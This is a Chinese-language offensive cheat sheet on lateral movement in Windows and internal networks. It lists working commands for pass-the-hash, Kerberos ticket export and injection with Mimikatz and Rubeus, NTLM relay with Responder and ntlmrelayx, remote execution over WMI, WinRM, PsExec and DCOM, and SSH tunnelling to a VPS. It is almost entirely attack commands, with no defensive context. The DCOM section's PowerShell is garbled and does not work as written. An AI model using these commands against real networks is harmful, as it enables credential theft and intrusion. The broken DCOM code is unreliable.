# 内网横向移动补充

## 1. Pass-the-Hash

### 原理

利用NTLM哈希直接认证，无需明文密码

### 利用

```bash
# Impacket
psexec.py -hashes :NTHASH user@target
wmiexec.py -hashes :NTHASH user@target
atexec.py -hashes :NTHASH user@target "command"

# CrackMapExec
crackmapexec smb target -u user -H NTHASH -x "whoami"
```

---

## 2. Pass-the-Ticket

### 原理

导出Kerberos票据并注入内存

### 利用

```bash
# Mimikatz导出
privilege::debug
sekurlsa::tickets /export

# 导入
kerberos::ppt ticket.kirbi

# Rubeus
Rubeus.exe dump
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 3. NTLM Relay

### 原理

中继NTLM认证到其他服务

### 利用

```bash
# Responder
responder -I eth0 -wrf

# ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t smb://target -c 'whoami'
```

---

## 4. WMI横向

### 利用

```bash
# Impacket
wmiexec.py user:pass@target

# PowerShell
Get-WmiObject -Class Win32_Process -ComputerName target
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" -ComputerName target
```

---

## 5. WinRM横向

```bash
# Evil-WinRM
evil-winrm -i target -u user -p pass

# CrackMapExec
crackmapexec winrm target -u user -p pass -x "whoami"
```

---

## 6. PSEXEC横向

```bash
# Impacket
psexec.py user:pass@target
psexec.py -hashes :NTHASH user@target

# CrackMapExec
crackmapexec smb target -u user -p pass -x "whoami"
```

---

## 7. DCOM横向

```bash
# PowerShell
$dcom = [System.Management.Automation.AutomationType]::GetType("System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")->GetMethod("CreateInstance", [System.Reflection.BindingFlags]"Public,Static,IgnoreCase", $null, @([System.Type]::GetType("System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")), $null)
$obj = $dcom.Invoke($null, "MMC20.Application", "TargetComputer")
```

---

## 8. SSH横向

```bash
# 密钥利用
ssh -i id_rsa user@target

# 端口转发
ssh -L 8080:target2:80 jump@host
ssh -R 8080:target2:80 vps@host
ssh -D 1080 user@host
```
